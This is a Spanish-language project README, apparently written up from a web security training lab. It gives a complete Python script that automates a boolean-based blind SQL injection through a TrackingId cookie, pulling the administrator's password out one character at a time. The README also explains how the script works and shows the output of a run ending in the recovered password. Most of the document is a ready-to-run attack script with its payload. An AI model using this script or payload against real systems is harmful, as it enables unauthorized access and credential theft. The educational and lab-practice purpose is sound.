# Blind SQL Injection Automation (Python)

## 📌 Descripción

Este proyecto demuestra la automatización de un ataque de tipo **Blind SQL Injection (boolean-based)** utilizando Python.

El objetivo es extraer la contraseña del usuario `administrator` mediante una vulnerabilidad en una cookie (`TrackingId`).

---

## 🛠️ Tecnologías utilizadas

* Python 3
* requests
* Kali Linux
* Burp Suite

---

## ⚙️ Configuración del entorno

### 1. Crear entorno virtual

```bash
python3 -m venv mi_env
source mi_env/bin/activate
```

### 2. Instalar dependencias

```bash
pip install requests
```

---

## 💻 Script completo (`sqli.py`)

```python
import requests
import string
import urllib.parse
import urllib3

# Desactiva advertencias SSL (solo para laboratorio)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# URL del laboratorio (reemplazar antes de usar)
url = 'https://LAB_URL'

# Payload de SQL Injection (extrae 1 carácter por posición)
payload = "' and (select substring(password,{},1) from users where username='administrator')='{}'--"

# Lista de caracteres a probar
characters = string.printable

# Variable donde se almacenará la contraseña
password = ''

# Cookie base (reemplazar con valor real)
tracking_id = 'YOUR_TRACKING_ID'

# Loop principal (20 caracteres del password)
for i in range(1, 21):
    for char in characters:

        # Construcción de la cookie con la inyección
        cookie = {
            'TrackingId': tracking_id + payload.format(i, char)
        }

        # Envío de la petición HTTP
        r = requests.get(url, cookies=cookie, verify=False)

        # Condición de éxito
        if "Welcome back" in r.text:
            password += char
            print(password)
            break

# Resultado final
print("[X] La contraseña es: {}".format(password))
```

---

## 🧠 Explicación del ataque

El script automatiza un ataque de tipo **Blind SQL Injection basado en condiciones booleanas**.

### 🔁 Funcionamiento:

1. Itera sobre cada posición del password (1–20)
2. Para cada posición:

   * Prueba múltiples caracteres (`string.printable`)
   * Inserta cada carácter en el payload SQL
3. Envía la petición usando una cookie vulnerable (`TrackingId`)
4. Evalúa la respuesta del servidor:

   * Si contiene `"Welcome back"` → el carácter es correcto
5. Construye la contraseña carácter por carácter

---

## 🍪 Vector de ataque

La inyección se realiza en la cookie:

```
TrackingId=valor + payload SQL
```

---

## 🧪 Tipo de ataque

* Blind SQL Injection
* Boolean-based
* Exfiltración carácter por carácter

---

## 📊 Resultado

```bash
o
o9
o98
o985
o985w
o985wn
o985wn5
o985wn5r
o985wn5ro
o985wn5rog
o985wn5rog2
o985wn5rog27
o985wn5rog27f
o985wn5rog27fq
o985wn5rog27fqf
o985wn5rog27fqfy
o985wn5rog27fqfyv
o985wn5rog27fqfyv1
o985wn5rog27fqfyv10
o985wn5rog27fqfyv10n

[X] La contraseña es: o985wn5rog27fqfyv10n
```

---

## 📸 Evidencia
* Request interceptada en Burp Suite
* Ejecución del script en Kali Linux
* Resultado final

---

## ⚠️ Disclaimer

Este proyecto es únicamente con fines educativos y fue realizado en un laboratorio controlado.
